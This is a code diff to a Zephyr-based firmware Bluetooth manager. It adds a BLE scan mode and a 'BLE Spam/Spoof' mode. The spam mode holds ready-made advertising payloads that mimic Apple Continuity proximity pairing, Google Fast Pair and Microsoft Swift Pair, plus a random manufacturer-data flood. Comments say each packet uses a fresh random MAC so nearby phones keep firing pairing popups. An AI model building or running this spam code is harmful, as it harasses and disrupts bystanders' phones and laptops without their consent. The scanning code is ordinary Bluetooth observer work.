@@ -13,7 +13,9 @@
 #include <zephyr/bluetooth/conn.h>
 #include <zephyr/bluetooth/gatt.h>
 #include <zephyr/bluetooth/hci.h>
+#include <zephyr/bluetooth/addr.h>
 #include <zephyr/settings/settings.h>
+#include <zephyr/random/random.h>
 #define BT_AVAILABLE 1
 #else
 #define BT_AVAILABLE 0
@@ -78,6 +80,14 @@ static struct
 
     struct k_mutex mutex;
 } bt_mgr;
+
+#if BT_AVAILABLE
+/* Depth chosen to match the existing GATT event queue's precedent
+ * (CONFIG_AKIRA_BLE_EVENT_QUEUE_DEPTH in ble_app_service.c); scan reports
+ * are lower-value than GATT events so a fixed constant is fine here. */
+#define BLE_SCAN_QUEUE_DEPTH 16
+K_MSGQ_DEFINE(g_scan_evt_q, sizeof(struct ble_scan_report), BLE_SCAN_QUEUE_DEPTH, 4);
+#endif
 
 /*===========================================================================*/
 /* Internal Functions                                                        */
@@ -584,6 +594,259 @@ int bt_manager_get_address(char *buffer, size_t len)
 #endif
 }
 
+#if BT_AVAILABLE
+/*===========================================================================*/
+/* BLE Observer (Scan) mode                                                  */
+/*===========================================================================*/
+
+struct scan_parse_ctx {
+    char name[BLE_SCAN_NAME_LEN];
+};
+
+static bool scan_ad_parse_cb(struct bt_data *data, void *user_data)
+{
+    struct scan_parse_ctx *ctx = user_data;
+
+    if (data->type == BT_DATA_NAME_COMPLETE || data->type == BT_DATA_NAME_SHORTENED) {
+        size_t len = data->data_len;
+
+        if (len > sizeof(ctx->name) - 1) {
+            len = sizeof(ctx->name) - 1;
+        }
+        memcpy(ctx->name, data->data, len);
+        ctx->name[len] = '\0';
+        return false; /* prefer first/complete name found, stop parsing */
+    }
+    return true;
+}
+
+static void scan_recv_cb(const struct bt_le_scan_recv_info *info,
+                          struct net_buf_simple *buf)
+{
+    struct ble_scan_report rep = {0};
+    struct scan_parse_ctx ctx = {0};
+    struct net_buf_simple_state state;
+
+    memcpy(rep.addr, info->addr->a.val, BLE_SCAN_ADDR_LEN);
+    rep.rssi = info->rssi;
+
+    net_buf_simple_save(buf, &state);
+    bt_data_parse(buf, scan_ad_parse_cb, &ctx);
+    net_buf_simple_restore(buf, &state);
+    memcpy(rep.name, ctx.name, sizeof(rep.name));
+
+    rep.adv_len = (buf->len > sizeof(rep.adv_data)) ? sizeof(rep.adv_data) : buf->len;
+    memcpy(rep.adv_data, buf->data, rep.adv_len);
+
+    (void)k_msgq_put(&g_scan_evt_q, &rep, K_NO_WAIT); /* drop on full queue */
+}
+
+static struct bt_le_scan_cb scan_callbacks = {
+    .recv = scan_recv_cb,
+};
+
+int bt_manager_scan_start(bool active)
+{
+    int ret = bt_manager_set_mode(BT_MODE_BLE_SCAN);
+
+    if (ret < 0) {
+        return ret;
+    }
+
+    /* A prior scan may still be running — e.g. a WASM app that exited or
+     * trapped without calling scan_stop leaves BT_DEV_SCANNING set, which
+     * makes bt_le_scan_start() return -EALREADY. Clear it first; the call is
+     * harmless (ignored -EALREADY) when nothing is scanning. */
+    bt_le_scan_stop();
+
+    k_msgq_purge(&g_scan_evt_q);
+    bt_le_scan_cb_register(&scan_callbacks);
+
+    struct bt_le_scan_param param = {
+        .type       = active ? BT_LE_SCAN_TYPE_ACTIVE : BT_LE_SCAN_TYPE_PASSIVE,
+        .options    = BT_LE_SCAN_OPT_FILTER_DUPLICATE,
+        .interval   = BT_GAP_SCAN_FAST_INTERVAL,
+        .window     = BT_GAP_SCAN_FAST_WINDOW,
+    };
+
+    int err = bt_le_scan_start(&param, NULL);
+
+    if (err) {
+        LOG_ERR("bt_manager_scan_start: bt_le_scan_start failed: %d", err);
+        bt_le_scan_cb_unregister(&scan_callbacks);
+        bt_manager_set_mode(BT_MODE_NONE);
+        return err;
+    }
+
+    LOG_INF("BLE scan started (active=%d)", active);
+    return 0;
+}
+
+int bt_manager_scan_stop(void)
+{
+    bt_le_scan_stop();
+    bt_le_scan_cb_unregister(&scan_callbacks);
+    bt_manager_set_mode(BT_MODE_NONE);
+    LOG_INF("BLE scan stopped");
+    return 0;
+}
+
+int bt_manager_scan_pop(struct ble_scan_report *out)
+{
+    if (!out) {
+        return -EINVAL;
+    }
+    if (k_msgq_get(&g_scan_evt_q, out, K_NO_WAIT) == 0) {
+        return 1;
+    }
+    return 0;
+}
+#else /* !BT_AVAILABLE */
+int bt_manager_scan_start(bool active) { (void)active; return -ENOTSUP; }
+int bt_manager_scan_stop(void) { return -ENOTSUP; }
+int bt_manager_scan_pop(struct ble_scan_report *out) { (void)out; return -ENOTSUP; }
+#endif /* BT_AVAILABLE */
+
+#if BT_AVAILABLE
+/*===========================================================================*/
+/* BLE Spam/Spoof mode                                                       */
+/*===========================================================================*/
+
+/* Advertising payload turnover rate — fast enough to be visibly "spammy"
+ * on a nearby scanner, slow enough not to starve the BT controller. */
+#define BLE_SPAM_ADV_INTERVAL_MS 200
+
+/* Manufacturer-data length for the random-flood preset. Arbitrary but
+ * fixed, named so the randomization loop bound isn't a bare literal. */
+#define BLE_SPAM_RANDOM_MFG_LEN 26
+
+/* Apple Continuity proximity-pair popup trigger (AirPods-style).
+ * AD type 0xFF (manufacturer data), Apple company ID 0x004C,
+ * type byte 0x07 (proximity pairing), minimal AirPods-shape payload. */
+static const uint8_t spam_apple_payload[] = {
+    0x4C, 0x00, 0x07, 0x19, 0x01, 0x0E, 0x20, 0x75,
+    0x00, 0x0A, 0x50, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x45, 0x12, 0x00, 0x00, 0x00, 0x00,
+};
+
+/* Google Fast Pair — service UUID 0xFE2C with a placeholder model ID.
+ * Real devices key this to a registered model ID; using a public example
+ * ID is sufficient to trigger the Fast Pair scan UI on Android. */
+static const uint8_t spam_fastpair_payload[] = {
+    0x2C, 0xFE, 0x41, 0x00, 0x92,
+};
+
+/* Microsoft Swift Pair — AD type 0x06, Microsoft beacon subtype 0x03. */
+static const uint8_t spam_swiftpair_payload[] = {
+    0x06, 0x00, 0x03, 0x00, 0x80,
+};
+
+static struct k_work_delayable spam_work;
+static int spam_preset;
+static uint32_t spam_packet_count;
+static bool spam_work_initialized;
+
+static void spam_work_handler(struct k_work *work)
+{
+    ARG_UNUSED(work);
+
+    /* USE_NRPA: fresh non-resolvable random MAC per advertisement. Targets
+     * dedup pairing popups by advertiser MAC, so a fixed identity address
+     * would fire the popup once then go silent; NRPA keeps it "spammy" and
+     * avoids leaking the console's real identity MAC to nearby scanners. */
+    struct bt_le_adv_param adv_param = BT_LE_ADV_PARAM_INIT(
+        BT_LE_ADV_OPT_USE_NRPA,
+        BT_GAP_ADV_FAST_INT_MIN_2,
+        BT_GAP_ADV_FAST_INT_MAX_2,
+        NULL);
+
+    uint8_t mfg_buf[BLE_SPAM_RANDOM_MFG_LEN];
+    struct bt_data ad[1];
+
+    switch (spam_preset) {
+    case BLE_SPAM_PRESET_APPLE:
+        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
+                                         spam_apple_payload, sizeof(spam_apple_payload));
+        break;
+    case BLE_SPAM_PRESET_FASTPAIR:
+        ad[0] = (struct bt_data)BT_DATA(BT_DATA_SVC_DATA16,
+                                         spam_fastpair_payload, sizeof(spam_fastpair_payload));
+        break;
+    case BLE_SPAM_PRESET_SWIFTPAIR:
+        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
+                                         spam_swiftpair_payload, sizeof(spam_swiftpair_payload));
+        break;
+    case BLE_SPAM_PRESET_RANDOM:
+    default:
+        mfg_buf[0] = 0xFF; /* company ID low byte, randomized below */
+        mfg_buf[1] = 0xFF;
+        for (size_t i = 2; i < sizeof(mfg_buf); i++) {
+            mfg_buf[i] = (uint8_t)sys_rand32_get();
+        }
+        ad[0] = (struct bt_data)BT_DATA(BT_DATA_MANUFACTURER_DATA,
+                                         mfg_buf, sizeof(mfg_buf));
+        break;
+    }
+
+    bt_le_adv_stop();
+    int err = bt_le_adv_start(&adv_param, ad, ARRAY_SIZE(ad), NULL, 0);
+
+    if (err) {
+        LOG_WRN("spam_work: adv_start failed: %d", err);
+    } else {
+        spam_packet_count++;
+    }
+
+    if (bt_mgr.mode == BT_MODE_BLE_SPAM) {
+        k_work_schedule(&spam_work, K_MSEC(BLE_SPAM_ADV_INTERVAL_MS));
+    }
+}
+
+int bt_manager_spam_start(int preset)
+{
+    if (preset < BLE_SPAM_PRESET_APPLE || preset > BLE_SPAM_PRESET_RANDOM) {
+        return -EINVAL;
+    }
+
+    int ret = bt_manager_set_mode(BT_MODE_BLE_SPAM);
+
+    if (ret < 0) {
+        return ret;
+    }
+
+    spam_preset = preset;
+    spam_packet_count = 0;
+    if (!spam_work_initialized) {
+        k_work_init_delayable(&spam_work, spam_work_handler);
+        spam_work_initialized = true;
+    }
+    k_work_schedule(&spam_work, K_NO_WAIT);
+
+    LOG_INF("BLE spam started (preset=%d)", preset);
+    return 0;
+}
+
+int bt_manager_spam_stop(void)
+{
+    struct k_work_sync sync;
+
+    k_work_cancel_delayable_sync(&spam_work, &sync);
+    bt_le_adv_stop();
+    bt_manager_set_mode(BT_MODE_NONE);
+    LOG_INF("BLE spam stopped (%u packets sent)", spam_packet_count);
+    return 0;
+}
+
+uint32_t bt_manager_spam_packet_count(void)
+{
+    return spam_packet_count;
+}
+#else /* !BT_AVAILABLE */
+int bt_manager_spam_start(int preset) { (void)preset; return -ENOTSUP; }
+int bt_manager_spam_stop(void) { return -ENOTSUP; }
+uint32_t bt_manager_spam_packet_count(void) { return 0; }
+#endif /* BT_AVAILABLE */
+
 /*===========================================================================*/
 /* Mode Switch                                                               */
 /*===========================================================================*/
@@ -593,11 +856,16 @@ int bt_manager_set_mode(bt_manager_mode_t mode)
     k_mutex_lock(&bt_mgr.mutex, K_FOREVER);
 
     if (mode != BT_MODE_NONE && bt_mgr.mode != BT_MODE_NONE && bt_mgr.mode != mode) {
-        /* HID and BLE_APP can coexist: HID uses BLE HID profile,
-         * BLE_APP adds custom GATT services on the same stack. */
+        /* HID coexists with the observer/advertiser WASM modes on the same
+         * stack: HID uses the BLE HID profile (connectable peripheral),
+         * BLE_APP adds custom GATT services, and BLE_SCAN/BLE_SPAM run the
+         * controller's observer/broadcaster role concurrently. HID keeps
+         * advertising; on release (set_mode NONE) hid_active restores it. */
         if ((bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_APP) ||
-            (bt_mgr.mode == BT_MODE_BLE_APP && mode == BT_MODE_HID)) {
-            LOG_INF("BT: HID and BLE_APP sharing stack, switching to mode %d", mode);
+            (bt_mgr.mode == BT_MODE_BLE_APP && mode == BT_MODE_HID) ||
+            (bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_SCAN) ||
+            (bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_BLE_SPAM)) {
+            LOG_INF("BT: HID sharing stack with mode %d", mode);
         } else if ((bt_mgr.mode == BT_MODE_HID && mode == BT_MODE_COMPANION) ||
                    (bt_mgr.mode == BT_MODE_COMPANION && mode == BT_MODE_HID)) {
             /* HID and Companion are exclusive but may be swapped at boot before
